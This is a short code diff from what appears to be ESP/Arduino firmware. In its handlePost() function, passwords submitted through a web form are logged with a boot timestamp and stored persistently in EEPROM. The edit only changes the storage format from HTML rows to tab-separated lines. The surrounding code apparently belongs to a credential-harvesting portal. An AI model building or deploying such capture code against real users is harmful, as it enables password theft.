@@ -78,7 +78,7 @@ void handlePost(){
       esp.print(pass);
     }
 
-    pass = "<tr><td>" + pass + "</td><td>" + millis()/1000 + "</td></tr>"; //Adding password and seconds after bootup in a ordered list.
+    pass = pass + '\t' + millis()/1000 + '\n'; //Adding password and seconds after bootup in a ordered list.
     allPass += pass; //Updating the full passwords.
 
     for (int i = 0; i <= pass.length(); ++i){ EEPROM.write(passEnd + i, pass[i]); } //Storing passwords to EEPROM
